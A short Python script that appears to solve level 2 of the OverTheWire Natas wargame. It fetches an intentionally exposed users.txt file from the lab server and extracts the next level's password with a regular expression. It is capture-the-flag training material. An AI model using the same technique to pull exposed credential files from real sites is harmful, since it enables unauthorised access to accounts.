#!/usr/bin/python3

import requests
import re
import os

username="natas2"
password=os.getenv("natas_pass")

url = "http://%s.natas.labs.overthewire.org/" % username

response = requests.get(url + "/files/users.txt",auth=(username,password))

flag = re.findall("natas3:(.*)",response.text)[0]
print(flag)